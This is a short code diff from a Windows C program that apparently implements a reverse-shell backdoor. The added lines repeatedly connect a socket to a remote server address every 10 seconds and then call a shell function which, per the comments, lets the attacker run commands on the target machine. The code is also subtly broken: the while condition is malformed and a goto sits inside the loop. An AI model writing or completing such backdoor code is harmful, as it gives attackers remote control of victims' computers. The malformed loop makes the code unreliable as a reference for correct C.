@@ -82,7 +82,26 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     ServAddr.sin_addr.s_addr = inet_addr(ServIP);
     //define port by converting integer to port
     ServAddr.sin_port = htons(ServPort);
-    //Ok.
-    
+
+    //Perfoam the connection.
+    start: //Start here is a checkpoint to the connection
+    while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)
+    {
+      //1st argument of connect funtion is socket.
+      //2nd argument specify the structre of sockaddr pointer.
+      //map the sockaddr strucure to Serveraddress memory location pointer.
+      //and then try to connect our target each 10 seconds.
+      //the target could run the payload before start executing the server.
+      //if the is equal to 0 proceed to other code otherwise make a loop because want to create connection with the target.
+      sleep(10); //Sleep 10 seconds for each iterations
+      //if connection established skip it otherwise goto start checkpoint to perfoam connection.
+      goto start;
+    }
+
+    //if connectione was successful start the shell function.
+    //which will make the attacker commands executable in the target. 
+    shell();
+
+
 
 }
